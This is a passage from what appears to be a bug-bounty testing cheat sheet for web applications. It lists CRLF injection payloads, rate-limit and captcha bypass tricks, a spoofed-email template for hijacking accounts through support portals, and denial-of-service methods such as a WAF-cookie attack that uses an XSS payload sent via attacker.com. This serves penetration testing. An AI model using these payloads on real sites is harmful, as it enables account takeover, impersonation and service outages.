2. Append null bytes (%00, %0d%0a, %0d, %0a, %09, %0C, %20) to the original endpoint (Ex: `POST /forgot-password%20 HTTP/1.1`). Also try adding the bytes after the value of parameter (like `email=tuhin@gmail.com%20`)

3. Race condition. Read this as a reference.

4. Add any random parameter in the request.

```
POST /forgot-password?fake=1 HTTP/1.1
Host: target.com
...

email=victim@gmail.com&alsofake=2
```

1. Change the request body (Form to JSON, XML or vice-versa).

2. Change request methods (POST to PUT or GET).

3. If developer implemented captcha based protection then try Captcha Bypass Techniques.

4. Gmail + and . trick.

5. Change api version (Ex: api/v2/1729/confirm-email to api/v1/1729/confirm-email).

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>CRLF</summary>

<dl>
<dd>

<details>
<summary>Fuzzing Payloads</summary>

<dl>
<dd>

Fuzz them then grep in responses for `BUG` ,to know which payload reflected or not

%0D%0A%0D%0ASet-Cookie:crlfinjection=Bug

%0AHeader-Test:Bug

%0A%20Header-Test:Bug

%20%0AHeader-Test:Bug

%23%OAHeader-Test:Bug

%E5%98%8A%E5%98%8DHeader-Test:Bug

%E5%98%8A%E5%98%8D%0AHeader-Test:Bug

%3F%0AHeader-Test:Bug

crlf%0AHeader-Test:Bug

crlf%0A%20Header-Test:Bug

crlf%20%0AHeader-Test:Bug

crlf%23%OAHeader-Test:Bug

crlf%E5%98%8A%E5%98%8DHeader-Test:Bug

crlf%E5%98%8A%E5%98%8D%0AHeader-Test:Bug

crlf%3F%0AHeader-Test:Bug

%0DHeader-Test:Bug

%0D%20Header-Test:Bug

%20%0DHeader-Test:Bug

%23%0DHeader-Test:Bug

%23%0AHeader-Test:Bug

%E5%98%8A%E5%98%8DHeader-Test:Bug

%E5%98%8A%E5%98%8D%0DHeader-Test:Bug

%3F%0DHeader-Test:Bug

crlf%0DHeader-Test:Bug

crlf%0D%20Header-Test:Bug

crlf%20%0DHeader-Test:Bug

crlf%23%0DHeader-Test:Bug

crlf%23%0AHeader-Test:Bug

crlf%E5%98%8A%E5%98%8DHeader-Test:Bug

crlf%E5%98%8A%E5%98%8D%0DHeader-Test:Bug

crlf%3F%0DHeader-Test:Bug

%0D%0AHeader-Test:Bug

%0D%0A%20Header-Test:Bug

%20%0D%0AHeader-Test:Bug

%23%0D%0AHeader-Test:Bug

\r\nHeader-Test:Bug

\r\n Header-Test:Bug

\r\n Header-Test:Bug

%5cr%5cnHeader-Test:Bug

%E5%98%8A%E5%98%8DHeader-Test:Bug

%E5%98%8A%E5%98%8D%0D%0AHeader-Test:Bug

%3F%0D%0AHeader-Test:Bug

crlf%0D%0AHeader-Test:Bug

crlf%0D%0A%20Header-Test:Bug

crlf%20%0D%0AHeader-Test:Bug

crlf%23%0D%0AHeader-Test:Bug

crlf\r\nHeader-Test:Bug

crlf%5cr%5cnHeader-Test:Bug

crlf%E5%98%8A%E5%98%8DHeader-Test:Bug

crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:Bug

crlf%3F%0D%0AHeader-Test:Bug

%0D%0A%09Header-Test:Bug

crlf%0D%0A%09Header-Test:Bug

%250AHeader-Test:Bug

%25250AHeader-Test:Bug

%%0A0AHeader-Test:Bug

%25%30AHeader-Test:Bug

%25%30%61Header-Test:Bug

%u000AHeader-Test:Bug

//www.google.com/%2F..  
Header-Test:Bug

/www.google.com/%2E%2E%2F%0D%0AHeader-Test:Bug

/google.com/%2F..%0D%0AHeader-Test:Bug

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Abusing Support Portal</summary>

<dl>
<dd>

1. Let's say victim's email is victim70@gmail.com. Create an account which looks similar to victim's email (for example, victim71@gmail.com). Use fake mailer and send a request to support@target.com and ask them to change your email id from victim70@gmail.com to victim71@gmail.com

```
From: victim70@gmail.com
Reply To: victim71@gmail.com
To: support@target.com
Subject: Change my E-mail address
Message:
Hello,
 My real email address is victim71@gmail.com. I mistakenly entered wrong email id (victim70@gmail.com) which I don't use anymore. So I kindly request you to change my email address from victim70@gmail.com to victim71@gmail.com.

Thanks & Regards
Victim
```

P.S: This is not a social engineering attack. Their mail box is not filtering spoofed emails properly. That's why the vulnerability exists. Modify the message as per your choice.

1. Try to create an account using @target.com email address and check if you have any higher priviledge (like viewing others support ticket).

2. Ticket Trick:3.1. Generate a support ticket from attacker1@gmail.com. You'll receive an email from support+ticketID@company.com. Try to email something from attacker2@gmail.com to support+ticketID@company.com. If you can see the email at tuhinbose70@gmail.com or if you can see the email at the support portal then it's possibly vulnerable. Now use the email support+ticketID@company.com in different workspaces (like slack, yammer etc) to login to their private workspace.3.2. You can create tickets by sending an email to support@target.com + you can view the tickets created by you in their support portal → most support portals can be integrated with SSO (authenticated users will automatically be logged into the support desk). Sometimes application doesn't enforce e-mail verification (or maybe you can bypass it) which allows to sign up with any e-mail address and read any tickets created by that e-mail address. So in these cases, you can takeover their 3rd party accounts like twitter, GitHub, Instagram etc (if created using the email address support@target.com). For example, in case of twitter, they send their password reset emails from verify@twitter.com. So you can follow the below steps:

```
1. Create an account on target.com with verify@twitter.com (Since they doesn't enforce email verification).
2. Now request for a password reset for the email support@target.com.
3. An email will be sent from verify@twitter.com to support@target.com which contains the code.
4. A ticket will be created which consists of the email body and you can view the ticket on their support portal.
```

</dd>
</dl>

</details>

<details>
<summary>Captcha bypass</summary>

<dl>
<dd>

1. Response manipulation.

2. Use previously used captcha value.

3. Use any token with same length(+1/-1).

4. Remove the param value or remove the entire parameter.

5. Change method from POST to GET(or PUT) and remove the captcha.

6. Change body to JSON or vice-versa.

7. Try OCR.

8. Check whether the captcha is in the source code. (Ex: 2+2)

9. Check whether the value of the captcha is in the source code.

10. Try to use the same captcha value several times with the different sessionIDs.

11. JSON Body? Combine 6 and 5.

12. Add headers:

`X-Forwarded-Host: 127.0.0.1  
X-Forwarded-For: 127.0.0.1  
X-Originating-IP: 127.0.0.1  
X-Remote-IP: 127.0.0.1  
X-Remote-Addr: 127.0.0.1  
X-Client-IP: 127.0.0.1  
X-Host: 127.0.0.1`

</dd>
</dl>

</details>

<details>
<summary>DOS</summary>

<dl>
<dd>

1. Application has a functionality where we can invite users via email → Try sending email invite to an invalid email address like `anyemail$1@anything.com` or `thisdoesntexists@tuhin1729.com`. If success then find out which Email Service Provider (by looking into email header or use mxtoolbox.com) the application is using. Check the hard bounce limit of that email provider (For example, hard bounce limit of AWS SES, Hubspot is arround 5%). If the bounce rate reached then the service provider will block company's service. As a result, they'll not be able to send emails anymore.

2. Long Password Dos: Use a very long string in the password field while creating account/updating password. If you observe a long delay (generally more than 10,000 milliseconds) in receiving response/get a 5XX status code then the application seems to be vulnerable.

3. Long String Dos: Look for any input field (like name, address etc) whose value is stored in the database. Enter a very long string in those parameters and look for delay/5xx status code. In case, the application has a feature where you can search for others' profile, use the long string in attacker's account and try searching for attacker's account from victim's account. Look for delay/5xx status code.

4. If application has a feature where you can upload an image, try uploading lottapixel.jpg and wait for a 5xx. In case, GIF files are allowed, try uber.gif. If SVG file uploads are allowed, then try bllionlaugh.svg

5. For wordpress websites, look for CVE-2018-6389.

6. Apache HTTP Server Byte Range DoS: If the application is using Apache 1.3.x, 2.0.x<2.0.64, 2.2.X<2.2.19 then add this header to any request.

7. Dos via Web Cache Poisoning: In case, you are able to redirect users by exploiting a web cache poisoning vulnerability, then try redirecting them to an invalid port (for example, example.com:1729).

8. Try null bytes (%00, %0d%0a, %0d, %0a, %09, %0C, %20) in different input fields.

9. Abusing Referrer cookie: Application uses WAF which blocks user on using some XSS/SQLi payloads + stores referrer URL value in cookies.

```
1. Create https://attacker.com/page.html which will redirect to target.com.
2. Send this URL to the victim https://attacker.com/page.html?%22%3E%3Cscript%3Ealert(1)%3C/script%3E
3. Victim will open the URL and will be redirected to target.com but a cookie will be generated (referrer=https%3A%2F%2Fattacker.com%2Fpage.html?%22%3E%3Cscript%3Ealert(1)%3C/script%3E;)
Now victim can't be able to access target.com as WAF will block their request because of using XSS payload in cookie.
```

1. Upload feature? → Upload a very large file to consume memory. If blocked, try redirection.

2. Missing rate limit on register/contact form → Memory corruption.

3. Permanent DoS on unregistered users: Check for account lockout. Also try 18th testcase of Testing 2 Factor Authentication

4. Send a message to victim from attacker → Delete attacker's account. Now try to open the inbox of victim.

5. If the application is using JSON, try using `null` as a value of some input field.

</dd>
</dl>

</details>
